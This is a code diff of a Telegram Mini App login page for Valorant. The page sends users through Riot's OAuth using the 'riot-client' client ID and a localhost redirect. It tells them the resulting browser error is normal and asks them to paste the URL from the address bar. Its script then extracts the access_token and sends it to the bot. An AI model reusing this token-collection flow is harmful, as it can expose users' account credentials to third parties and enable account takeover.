@@ -4,23 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход в Valorant</title>
-    <!-- Подключаем скрипт Telegram, чтобы Mini App работал -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--tg-theme-bg-color, #fff);
             color: var(--tg-theme-text-color, #000);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
             padding: 20px;
             text-align: center;
         }
-        .container {
-            max-width: 400px;
-            width: 100%;
-        }
+        .container { max-width: 400px; margin: 0 auto; }
         .btn {
             background-color: var(--tg-theme-button-color, #3390ec);
             color: var(--tg-theme-button-text-color, #fff);
@@ -35,9 +28,18 @@
             margin: 10px 0;
             width: 100%;
             box-sizing: border-box;
-            transition: opacity 0.2s;
         }
-        .btn:active { opacity: 0.8; }
+        .btn-red { background-color: #e91e63; }
+        .alert {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 15px;
+            border: 1px solid #ffeeba;
+            text-align: left;
+        }
         textarea {
             width: 100%;
             height: 80px;
@@ -45,98 +47,78 @@
             border: 2px solid var(--tg-theme-hint-color, #ccc);
             padding: 10px;
             box-sizing: border-box;
-            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            color: var(--tg-theme-text-color, #000);
             resize: none;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        textarea:focus {
-            border-color: var(--tg-theme-button-color, #3390ec);
-            outline: none;
+            font-size: 12px;
+            font-family: monospace;
         }
         .step {
             background: var(--tg-theme-secondary-bg-color, #f5f5f5);
             padding: 15px;
             border-radius: 15px;
             margin-bottom: 20px;
-            text-align: left;
         }
-        h3 { margin-top: 0; font-size: 18px; margin-bottom: 10px;}
-        p { font-size: 14px; line-height: 1.4; margin-bottom: 10px; color: var(--tg-theme-hint-color, #555); }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Авторизация</h2>
+        <h2>Вход (Режим Riot Client)</h2>
         
         <div class="step">
-            <h3>Шаг 1. Вход</h3>
-            <p>Нажми кнопку, войди в аккаунт Riot. Когда увидишь белый экран или логотип — скопируй ссылку из браузера.</p>
-            <!-- Ссылка авторизации с параметрами -->
-            <a href="https://auth.riotgames.com/authorize?redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in&client_id=play-valorant-web-prod&response_type=token%20id_token&nonce=1&scope=account%20openid" target="_blank" class="btn">🚀 Открыть Riot Login</a>
+            <h3>Шаг 1. Авторизация</h3>
+            <div class="alert">
+                ⚠️ <b>ВНИМАНИЕ:</b> После входа вы увидите ошибку "Не удается получить доступ к сайту" (localhost). <br>
+                <b>ЭТО НОРМАЛЬНО!</b> Скопируйте ссылку из адресной строки на этой странице с ошибкой.
+            </div>
+            <!-- Ссылка авторизации для RIOT CLIENT -->
+            <a href="https://auth.riotgames.com/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid" target="_blank" class="btn btn-red">🚀 Войти (Riot Client)</a>
         </div>
 
         <div class="step">
-            <h3>Шаг 2. Токен</h3>
-            <p>Вставь скопированную ссылку сюда:</p>
-            <textarea id="urlInput" placeholder="https://playvalorant.com/opt_in#access_token=..."></textarea>
-            
-            <button id="sendBtn" class="btn" style="background-color: #2ea043; display: none;">✅ Готово! Подключить</button>
+            <h3>Шаг 2. Вставка ссылки</h3>
+            <p>Скопируйте ссылку, которая начинается на <code>http://localhost/redirect...</code></p>
+            <textarea id="urlInput" placeholder="Вставьте полную ссылку сюда..."></textarea>
+            <button id="sendBtn" class="btn" style="display: none;">✅ Подключить</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Растягиваем на весь экран
+        tg.expand();
 
         const urlInput = document.getElementById('urlInput');
         const sendBtn = document.getElementById('sendBtn');
 
-        // Слушаем ввод текста
         urlInput.addEventListener('input', () => {
             const text = urlInput.value;
-            // Показываем кнопку только если ссылка похожа на правильную
-            if (text.includes('access_token=') || text.includes('id_token=')) {
+            if (text.includes('access_token=')) {
                 sendBtn.style.display = 'block';
             } else {
                 sendBtn.style.display = 'none';
             }
         });
 
-        // Обработка нажатия "Готово"
         sendBtn.addEventListener('click', () => {
-            const text = urlInput.value;
+            let text = urlInput.value.trim(); // Убираем пробелы
             
             try {
-                // Пытаемся распарсить ссылку
-                // Заменяем # на ? чтобы URL класс мог прочитать параметры
-                let cleanUrl = text.replace('#', '?'); 
-                const urlObj = new URL(cleanUrl);
-                const params = new URLSearchParams(urlObj.search);
+                // Пытаемся вытащить токен даже из кривой ссылки
+                let accessToken = "";
                 
-                const accessToken = params.get('access_token');
-                
+                if (text.includes("access_token=")) {
+                    let start = text.indexOf("access_token=") + 13;
+                    let end = text.indexOf("&", start);
+                    if (end === -1) end = text.length;
+                    accessToken = text.substring(start, end);
+                }
+
                 if (accessToken) {
-                    // Отправляем данные боту (в Python)
-                    const data = JSON.stringify({
-                        access_token: accessToken
-                    });
-                    tg.sendData(data);
+                    tg.sendData(JSON.stringify({ access_token: accessToken }));
                 } else {
-                    tg.showAlert('В ссылке нет токена! Убедитесь, что скопировали всё.');
+                    tg.showAlert('Не вижу access_token в этой ссылке!');
                 }
             } catch (e) {
-                // Если парсинг не удался, пробуем грубый метод
-                if (text.includes("access_token=")) {
-                    const start = text.indexOf("access_token=") + 13;
-                    const end = text.indexOf("&", start);
-                    const token = text.substring(start, end === -1 ? undefined : end);
-                    tg.sendData(JSON.stringify({ access_token: token }));
-                } else {
-                    tg.showAlert("Неверная ссылка. Попробуйте еще раз.");
-                }
+                tg.showAlert("Ошибка парсинга: " + e.message);
             }
         });
     </script>
